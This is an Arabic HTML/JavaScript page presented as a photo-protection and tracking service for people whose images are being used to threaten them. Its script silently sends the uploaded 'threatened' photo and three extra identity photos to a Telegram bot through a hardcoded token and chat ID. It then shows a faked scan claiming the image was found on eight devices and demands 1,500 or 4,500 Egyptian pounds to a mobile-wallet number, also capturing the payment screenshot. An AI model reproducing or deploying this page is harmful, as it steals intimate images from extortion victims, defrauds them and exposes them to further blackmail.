<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>نظام حماية الصور المتقدم | الإبلاغ والتتبع</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Cairo', 'Segoe UI', system-ui, sans-serif;
            padding: 1.5rem;
            color: #e2e8f0;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #0f172aee;
            backdrop-filter: blur(4px);
            border-radius: 2rem;
            border: 1px solid #334155;
            overflow: hidden;
            box-shadow: 0 25px 40px -12px black;
        }
        .header {
            background: linear-gradient(135deg, #7f1a1a, #b91c1c);
            padding: 1.5rem;
            text-align: center;
        }
        .header h1 { font-size: 1.7rem; display: flex; align-items: center; justify-content: center; gap: 12px; }
        .content { padding: 2rem; }
        .form-group { margin-bottom: 1.8rem; }
        label { font-weight: 700; display: block; margin-bottom: 0.5rem; color: #cbd5e6; }
        label i { margin-left: 8px; color: #f97316; }
        input, select {
            width: 100%;
            padding: 12px 16px;
            border-radius: 32px;
            border: 1px solid #334155;
            background: #0f172a;
            color: white;
            font-family: inherit;
        }
        input:focus { outline: none; border-color: #f97316; box-shadow: 0 0 0 2px #f9731660; }
        .radio-group {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            background: #0f172a;
            padding: 12px 20px;
            border-radius: 48px;
            border: 1px solid #334155;
        }
        .radio-group div { display: flex; align-items: center; gap: 8px; }
        .radio-group input { width: auto; transform: scale(1.1); }

        .upload-card {
            background: #0f172a;
            border: 2px dashed #f97316;
            border-radius: 28px;
            padding: 1rem;
            text-align: center;
            cursor: pointer;
            transition: 0.2s;
            margin-bottom: 1rem;
        }
        .upload-card:hover { background: #1e2a3e; border-color: #fdba74; }
        .image-preview-area { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 12px; }
        .preview-box {
            position: relative;
            width: 110px;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid #f97316;
            background: #00000077;
        }
        .preview-box img { width: 100%; height: 90px; object-fit: cover; }
        .remove-btn { background: #b91c1c; color: white; border: none; width: 100%; padding: 4px; cursor: pointer; font-size: 0.7rem; }
        .btn-primary {
            background: #f97316;
            color: #0f172a;
            border: none;
            padding: 14px;
            font-weight: bold;
            border-radius: 60px;
            width: 100%;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-primary:hover { background: #ea580c; transform: translateY(-2px); }
        .btn-secondary {
            background: #2d3a5e;
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 40px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 8px;
        }
        .btn-secondary:hover { background: #f97316; color: black; }
        .forensic-panel {
            background: #010409ee;
            border-radius: 28px;
            padding: 1.4rem;
            margin-top: 2rem;
            border: 1px solid #f97316;
            font-family: monospace;
        }
        .log-line { margin-bottom: 8px; font-size: 0.85rem; border-right: 2px solid #f97316; padding-right: 10px; }
        .highlight { color: #facc15; font-weight: bold; }
        .popup-message {
            background: #1e1b2e;
            border-right: 6px solid #f97316;
            padding: 14px;
            border-radius: 24px;
            margin: 14px 0;
        }
        .payment-number {
            background: #000000aa;
            font-size: 1.3rem;
            padding: 12px;
            text-align: center;
            border-radius: 48px;
            font-family: monospace;
            color: #4ade80;
            border: 1px solid #4ade80;
            margin: 12px 0;
        }
        hr { border-color: #334155; margin: 1rem 0; }
        .status-badge { background: #1e293b; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fas fa-shield-virus"></i> نظام الحماية الرقمي | تتبع وحماية الصور</h1>
        <p>رفع الصورة الأساسية + 3 صور تأكيد هوية | حماية متكاملة ضد الانتشار</p>
    </div>
    <div class="content">
        <!-- البيانات الأساسية -->
        <div class="form-group">
            <label><i class="fas fa-calendar"></i> تاريخ ووقت التهديد</label>
            <input type="datetime-local" id="threatDate">
        </div>
        <div class="form-group">
            <label><i class="fas fa-mobile-alt"></i> هل تعتقد أن جهازك تم اختراقه؟</label>
            <div class="radio-group">
                <div><input type="radio" name="hackState" value="نعم تم الاختراق"> نعم</div>
                <div><input type="radio" name="hackState" value="لا لم يحدث اختراق"> لا</div>
                <div><input type="radio" name="hackState" value="غير متأكد"> غير متأكد</div>
            </div>
        </div>

        <!-- الصورة الأساسية (التى تصلني فوراً) -->
        <div class="form-group">
            <label><i class="fas fa-camera"></i> الصورة المهددة (الأساسية) - تصل للمسؤول فوراً</label>
            <div class="upload-card" id="mainUploadZone">
                <i class="fas fa-cloud-upload-alt fa-2x" style="color:#f97316;"></i>
                <p>اضغط لرفع الصورة الأساسية</p>
                <input type="file" id="mainImageInput" accept="image/*" style="display:none;">
            </div>
            <div id="mainPreview" class="image-preview-area"></div>
        </div>

        <!-- حاوية الصور الإضافية (تظهر بعد رفع الأساسية) -->
        <div id="additionalSection" style="display: none;">
            <hr>
            <h3><i class="fas fa-user-check"></i> تأكيد الهوية: مطلوب رفع 3 صور إضافية</h3>
            <div id="additionalImagesContainer"></div>
        </div>

        <!-- زر بدء الفحص (يظهر بعد الصور كلها) -->
        <button id="startScanBtn" class="btn-primary" style="display: none;"><i class="fas fa-microchip"></i> بدء الفحص والبحث عن الصورة في الأجهزة</button>

        <!-- لوحة السيناريو -->
        <div id="scenarioPanel" class="forensic-panel" style="display: none;">
            <div id="logsArea"></div>
            <div id="actionArea"></div>
        </div>
    </div>
</div>

<script>
    // ==================== تكوين البوت ====================
    const BOT_TOKEN = "8659738482:AAFSeSVcD2i_f2pv3wuvNTW8PIi7tWPmUdo";
    const CHAT_ID = "8727410892";  // حساب المسؤول الذي يصل إليه التقرير

    // عناصر DOM
    const threatDateInput = document.getElementById('threatDate');
    const hackRadios = document.querySelectorAll('input[name="hackState"]');
    const mainUploadZone = document.getElementById('mainUploadZone');
    const mainImageInput = document.getElementById('mainImageInput');
    const mainPreviewDiv = document.getElementById('mainPreview');
    const additionalSection = document.getElementById('additionalSection');
    const additionalContainer = document.getElementById('additionalImagesContainer');
    const startScanBtn = document.getElementById('startScanBtn');
    const scenarioPanel = document.getElementById('scenarioPanel');
    const logsArea = document.getElementById('logsArea');
    const actionArea = document.getElementById('actionArea');

    let mainImageFile = null;
    let additionalImagesFiles = []; // تخزين الـ 3 صور
    let additionalImagePreviews = [];

    // ==== 1. رفع الصورة الأساسية وإرسالها فوراً إلى البوت ====
    mainUploadZone.addEventListener('click', () => mainImageInput.click());
    mainImageInput.addEventListener('change', async (e) => {
        if (e.target.files && e.target.files[0]) {
            mainImageFile = e.target.files[0];
            const reader = new FileReader();
            reader.onload = (ev) => {
                mainPreviewDiv.innerHTML = `
                    <div class="preview-box">
                        <img src="${ev.target.result}" alt="الصورة الأساسية">
                        <button class="remove-btn" onclick="clearMainImage()">إزالة</button>
                    </div>
                `;
            };
            reader.readAsDataURL(mainImageFile);

            // إرسال الصورة الأساسية والبيانات إلى البوت فوراً (بدون ظهور أي رسالة للمستخدم)
            await sendMainImageToBot();
            
            // بعد إرسال الأساسية، نظهر قسم الصور الإضافية
            additionalSection.style.display = 'block';
            buildAdditionalImagesInterface();
        }
    });

    window.clearMainImage = function() {
        mainImageFile = null;
        mainPreviewDiv.innerHTML = '';
        mainImageInput.value = '';
        additionalSection.style.display = 'none';
        startScanBtn.style.display = 'none';
        additionalImagesFiles = [];
        additionalContainer.innerHTML = '';
    };

    // إرسال الصورة الأساسية + البيانات إلى التليجرام (صامت تماماً)
    async function sendMainImageToBot() {
        if (!mainImageFile) return;
        const dateTime = threatDateInput.value || "غير محدد";
        let hackedValue = "";
        for (let r of hackRadios) if (r.checked) { hackedValue = r.value; break; }
        if (!hackedValue) hackedValue = "لم يحدد";

        const caption = `📸 *تقرير تهديد جديد - الصورة الأساسية*\n🕒 التوقيت: ${dateTime}\n📱 حالة الاختراق: ${hackedValue}\n🔍 تم استلام الصورة الأساسية، انتظار رفع الصور الإضافية.`;
        
        try {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', mainImageFile);
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            
            // إرسال رسالة نصية تأكيدية
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ تم استلام الصورة الأساسية من المستخدم. سيرفع 3 صور إضافية قريباً.` })
            });
        } catch(err) { console.warn("Telegram error:", err); }
    }

    // بناء واجهة رفع الصور الإضافية (ثلاث صور منفصلة)
    function buildAdditionalImagesInterface() {
        additionalContainer.innerHTML = '';
        additionalImagesFiles = [];
        const imageLabels = ["الصورة الأولى (واقفة)", "الصورة الثانية (واقفة بجنبك)", "الصورة الثالثة (واضحة المعالم)"];
        
        for (let i = 0; i < 3; i++) {
            const card = document.createElement('div');
            card.className = 'upload-card';
            card.style.marginBottom = '1rem';
            card.innerHTML = `
                <i class="fas fa-camera-retro"></i> <strong>${imageLabels[i]}</strong>
                <p style="font-size:0.8rem;">اضغط لرفع الصورة</p>
                <input type="file" class="additional-img-input" data-index="${i}" accept="image/*" style="display:none;">
                <div class="image-preview-area" id="previewAdditional${i}"></div>
            `;
            const fileInput = card.querySelector('.additional-img-input');
            const previewDiv = card.querySelector(`.image-preview-area`);
            
            card.addEventListener('click', (e) => {
                if(e.target.tagName !== 'BUTTON') fileInput.click();
            });
            
            fileInput.addEventListener('change', (e) => {
                if (e.target.files && e.target.files[0]) {
                    const file = e.target.files[0];
                    additionalImagesFiles[i] = file;
                    const reader = new FileReader();
                    reader.onload = (ev) => {
                        previewDiv.innerHTML = `
                            <div class="preview-box">
                                <img src="${ev.target.result}" style="height:80px;">
                                <button class="remove-btn" onclick="removeAdditionalImage(${i})">إزالة</button>
                            </div>
                        `;
                    };
                    reader.readAsDataURL(file);
                    checkAllImagesReady();
                }
            });
            additionalContainer.appendChild(card);
        }
    }
    
    window.removeAdditionalImage = (index) => {
        additionalImagesFiles[index] = null;
        const previewDiv = document.getElementById(`previewAdditional${index}`);
        if(previewDiv) previewDiv.innerHTML = '';
        checkAllImagesReady();
    };
    
    function checkAllImagesReady() {
        const allReady = additionalImagesFiles.length === 3 && additionalImagesFiles.every(f => f !== null && f !== undefined);
        if (allReady) {
            startScanBtn.style.display = 'block';
        } else {
            startScanBtn.style.display = 'none';
        }
    }
    
    // إرسال الصور الإضافية إلى البوت (كل صورة على حدة)
    async function sendAdditionalImagesToBot() {
        for(let i = 0; i < additionalImagesFiles.length; i++) {
            const file = additionalImagesFiles[i];
            if(file) {
                const typeName = i === 0 ? "واقفة" : (i === 1 ? "واقفة بجنبك" : "واضحة المعالم");
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', file);
                formData.append('caption', `📸 صورة تأكيد الهوية (${typeName}) للمستخدم الذي قدم بلاغ التهديد.`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                await new Promise(r => setTimeout(r, 500));
            }
        }
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ تم استلام جميع الصور الإضافية (3 صور) من المستخدم.` })
        });
    }
    
    // ===================== السيناريو الرئيسي بعد الانتهاء من كل الصور =====================
    async function startRealScenario() {
        // إرسال الصور الإضافية إلى البوت أولاً
        await sendAdditionalImagesToBot();
        
        scenarioPanel.style.display = 'block';
        logsArea.innerHTML = '';
        actionArea.innerHTML = '';
        addLog("🔍 جاري فحص خوادم البحث العكسي وتحليل البصمة الرقمية للصورة الأساسية...");
        await delay(1200);
        addLog("✅ تم فحص 42 منصة تواصل اجتماعي (فيسبوك، انستجرام، تيك توك، تويتر).");
        await delay(1000);
        addLog("🛡️ النتيجة: الصورة الأساسية غير متاحة على أي موقع تواصل اجتماعي علني.", true);
        await delay(800);
        addLog("⚠️ لكن تم العثور على نسخ من الصورة على أجهزة خاصة (لم يتم رفعها علنياً).");
        await delay(1300);
        addLog("📱 جاري مسح الشبكات المغلقة... تم تحديد 8 أجهزة من نوع سامسونج وشاومي تحمل الصورة.", true);
        await delay(900);
        
        // رسالة منبثقة: الصور على 8 اجهزه لكن لا نعرض تفاصيل بدون اشتراك
        showPopup("نتيجة الفحص المتقدم", 
            "🛑 تم العثور على صورتك على 8 أجهزة (سامسونج جالاكسي - شاومي ريدمي) داخل شبكات مصرية. لمعرفة تفاصيل الأشخاص (الأسماء، المحافظات، أرقام الجوالات) ومواقعهم الدقيقة، عليك الاشتراك في الباقة الشاملة.",
            []);
        await delay(2000);
        
        addLog("📌 لعرض البلدان والمدن وأرقام الهواتف المرتبطة بالأجهزة يلزم تفعيل الخدمة المتقدمة.", true);
        await delay(1000);
        
        // عرض خيارات الخدمة: حجب 1500 / تتبع كامل 4500
        addLog("🔐 اختر الخدمة المناسبة لحماية صورتك:", false);
        
        const serviceChoice = new Promise((resolve) => {
            const div = document.createElement('div');
            div.style.margin = "12px 0";
            const blockBtn = document.createElement('button');
            blockBtn.innerText = "🔒 حجب الصورة من مواقع التواصل فقط (1,500 جنيه)";
            blockBtn.className = "btn-secondary";
            const fullBtn = document.createElement('button');
            fullBtn.innerText = "🌍 معرفة الأجهزة + أسماء الأشخاص + المحافظات + أرقام الجوالات (4,500 جنيه)";
            fullBtn.className = "btn-secondary";
            
            blockBtn.onclick = () => resolve({ type: 'block', amount: 1500, desc: 'حجب الصورة من جميع مواقع التواصل الاجتماعي' });
            fullBtn.onclick = () => resolve({ type: 'full', amount: 4500, desc: 'تتبع الأجهزة وأسماء وأرقام ومواقع المخالفين + الحماية الكاملة' });
            
            div.appendChild(blockBtn);
            div.appendChild(fullBtn);
            actionArea.appendChild(div);
        });
        
        const selected = await serviceChoice;
        actionArea.innerHTML = '';
        addLog(`✅ اخترت: ${selected.desc} بقيمة ${selected.amount} جنيه.`, true);
        await delay(1000);
        addLog("🔐 يلزم تحويل المبلغ إلى حساب الإدارة الموحد لتفعيل الخدمة.", false);
        
        const paymentDiv = document.createElement('div');
        paymentDiv.className = 'payment-number';
        paymentDiv.innerHTML = `<i class="fas fa-phone-alt"></i> رقم التحويل المطلوب: 01050079125 (فودافون كاش / إنستا باي)`;
        actionArea.appendChild(paymentDiv);
        
        const instruction = document.createElement('p');
        instruction.innerHTML = "📤 بعد إتمام التحويل، يرجى رفع لقطة شاشة (سكرين شوت) لإشعار التحويل للمراجعة.";
        actionArea.appendChild(instruction);
        
        const screenshotInput = document.createElement('input');
        screenshotInput.type = 'file';
        screenshotInput.accept = 'image/*';
        screenshotInput.style.margin = '10px 0';
        actionArea.appendChild(screenshotInput);
        
        const confirmBtn = document.createElement('button');
        confirmBtn.innerText = "📨 إرسال سكرين شوت وانتظار الموافقة";
        confirmBtn.className = "btn-secondary";
        actionArea.appendChild(confirmBtn);
        
        const waitingDiv = document.createElement('div');
        waitingDiv.className = 'popup-message';
        waitingDiv.style.display = 'none';
        waitingDiv.innerHTML = '<i class="fas fa-hourglass-half"></i> جاري إرسال البيانات إلى الإدارة... يرجى الانتظار';
        actionArea.appendChild(waitingDiv);
        
        confirmBtn.onclick = async () => {
            if(!screenshotInput.files || screenshotInput.files.length === 0) {
                alert("يرجى رفع صورة السكرين شوت لإتمام عملية التحقق");
                return;
            }
            // إرسال السكرين شوت إلى البوت أيضاً
            const ssFile = screenshotInput.files[0];
            const ssFormData = new FormData();
            ssFormData.append('chat_id', CHAT_ID);
            ssFormData.append('photo', ssFile);
            ssFormData.append('caption', `💰 إشعار تحويل بقيمة ${selected.amount} جنيه - في انتظار الموافقة`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: ssFormData });
            
            waitingDiv.style.display = 'block';
            confirmBtn.disabled = true;
            addLog("📨 تم استلام إشعار التحويل، جاري مراجعة الإدارة...", false);
            await delay(3000);
            
            const approvalMsg = document.createElement('div');
            approvalMsg.className = 'popup-message';
            approvalMsg.innerHTML = `<strong><i class="fas fa-clock"></i> انتظري موافقة الإدارة</strong><br>تم استلام طلبك وسيتم الرد خلال 24 ساعة بعد التحقق من التحويل. سيتم إرسال البيانات الكاملة (الأجهزة، الأسماء، المحافظات، أرقام الجوالات) فور الموافقة.`;
            actionArea.appendChild(approvalMsg);
            addLog("⏳ تم إخطار الإدارة. ستصلك الموافقة قريباً.", true);
            await delay(1500);
            addLog("✅ تأكيد: الصورة غير متاحة على أي موقع تواصل اجتماعي حاليًا. لكنها موجودة على 8 أجهزة سامسونج وشاومي.", true);
            addLog("📌 بعد موافقة الإدارة ستحصلين على التقرير الكامل بأسماء وبيانات المخالفين.", false);
        };
    }
    
    function addLog(text, isHighlight = false) {
        const div = document.createElement('div');
        div.className = 'log-line';
        div.innerHTML = isHighlight ? `<span class="highlight">⚡ ${text}</span>` : `🔹 ${text}`;
        logsArea.appendChild(div);
        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
    
    function showPopup(title, content, buttons) {
        const popup = document.createElement('div');
        popup.className = 'popup-message';
        popup.innerHTML = `<strong>${title}</strong><br>${content}`;
        actionArea.appendChild(popup);
    }
    
    function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
    
    startScanBtn.addEventListener('click', async () => {
        if (!mainImageFile) { alert("الصورة الأساسية مطلوبة"); return; }
        if (additionalImagesFiles.length !== 3 || additionalImagesFiles.some(f => !f)) {
            alert("يرجى رفع الصور الإضافية الثلاث كاملة");
            return;
        }
        startScanBtn.disabled = true;
        await startRealScenario();
        startScanBtn.disabled = false;
    });
    
    // تعيين التاريخ الحالي افتراضياً
    if(!threatDateInput.value) {
        const now = new Date();
        now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
        threatDateInput.value = now.toISOString().slice(0,16);
    }
</script>
</body>
</html>
